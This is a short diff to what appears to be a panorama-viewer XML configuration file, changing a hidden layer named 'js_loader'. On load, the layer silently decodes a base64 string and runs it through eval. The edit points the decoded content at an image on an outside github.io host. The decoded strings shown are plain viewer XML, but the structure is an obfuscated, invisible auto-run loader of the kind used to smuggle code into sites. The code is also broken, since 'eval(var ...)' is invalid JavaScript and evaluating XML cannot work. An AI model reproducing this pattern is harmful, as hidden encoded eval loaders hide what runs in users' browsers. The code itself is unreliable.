@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <viewer>
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('PHZpZXdlcj48aW5jbHVkZSBwYXRoPSIvMzYwL3NjZW5lMS5qcGciLz48L3ZpZXdlcj4=');eval(w)););"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHZpZXdlcj4KICA8aW5jbHVkZSBwYXRoPSJodHRwczovL2l0ZW5naHViLmdpdGh1Yi5pby9pdGh1Yi9NaW5kJTIwRnJlc2glMjBSQS5qcGciLz4KPC92aWV3ZXI+');eval(w)););"/>
 </viewer>
